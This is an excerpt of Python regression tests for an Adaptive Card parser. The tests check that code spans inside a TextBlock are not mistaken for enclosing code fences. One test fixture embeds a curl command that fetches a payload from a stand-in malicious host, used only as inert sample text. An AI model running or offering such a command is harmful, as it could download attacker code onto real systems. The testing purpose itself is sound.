"""
Regression tests for parse_adaptive_card() — in particular, a real bug where
a triple-backtick code span embedded inside a TextBlock's own text value
(e.g. a shell command or IOC the model wrapped in markdown) was mistaken for
an enclosing code fence, corrupting an otherwise-valid Adaptive Card and
...
def test_embedded_code_span_inside_text_block_is_not_mistaken_for_a_fence():
    """The exact bug: a ``` code span inside a TextBlock's text value must not corrupt the JSON."""
    raw = _card("Run: ```curl https://malicious.example/payload``` to check")
    card, fallback = parse_adaptive_card(raw)
    assert card is not None, "a valid AdaptiveCard must still be recognized as one"
...
def test_whole_json_wrapped_in_a_leading_fence_still_strips_correctly():
    """The common, intentional case: the model wraps its entire JSON response in ```json ... ```."""
    raw = "```json\n" + _card("hello") + "\n```"
